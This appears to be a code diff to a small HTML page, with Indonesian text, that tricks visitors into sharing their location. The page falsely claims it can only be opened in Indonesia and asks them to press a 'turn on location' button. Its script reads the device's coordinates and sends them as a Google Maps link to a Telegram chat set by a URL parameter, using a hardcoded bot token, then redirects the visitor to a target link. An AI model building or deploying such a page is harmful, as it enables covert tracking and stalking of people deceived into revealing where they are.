@@ -11,12 +11,26 @@
         }
         p {
             font-size: 18px;
+            margin-bottom: 20px;
+        }
+        button {
+            padding: 12px 20px;
+            font-size: 16px;
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
         }
     </style>
     <script>
         const BOT_TOKEN = "8466065352:AAHRmeCDR9R5UEBk1MQ5seUw-NCu1QOLs9A";
+        let chatId, target;
 
-        function sendLocation(chatId, targetUrl) {
+        function sendLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(position => {
                     let lat = position.coords.latitude;
@@ -24,38 +38,29 @@
                     let locationMsg = `📍 Lokasi: https://www.google.com/maps?q=${lat},${lon}`;
                     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(locationMsg)}`)
                         .then(() => {
-                            window.location.href = targetUrl;
+                            window.location.href = target;
                         });
                 }, () => {
-                    window.location.href = targetUrl;
+                    window.location.href = target;
                 });
             } else {
-                window.location.href = targetUrl;
+                window.location.href = target;
             }
         }
 
         window.onload = () => {
             const params = new URLSearchParams(window.location.search);
-            let chatId = params.get("chatid");
-            let target = params.get("target");
+            chatId = params.get("chatid");
+            target = decodeURIComponent(params.get("target"));
 
-            if (chatId && target) {
-                document.getElementById("message").innerText = "Halaman ini hanya bisa dibuka di Indonesia, untuk mengetahui lokasi anda maka nyalakan lokasi.";
-                // Langsung minta lokasi
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(() => {
-                        sendLocation(chatId, decodeURIComponent(target));
-                    }, () => {
-                        window.location.href = decodeURIComponent(target);
-                    });
-                }
-            } else {
+            if (!chatId || !target) {
                 document.body.innerHTML = "<h3>Link tidak valid</h3>";
             }
         };
     </script>
 </head>
 <body>
-    <p id="message">Sedang memproses...</p>
+    <p>Halaman ini hanya bisa dibuka di Indonesia, untuk mengetahui lokasi anda maka nyalakan lokasi.</p>
+    <button onclick="sendLocation()">Nyalakan Lokasi</button>
 </body>
 </html>
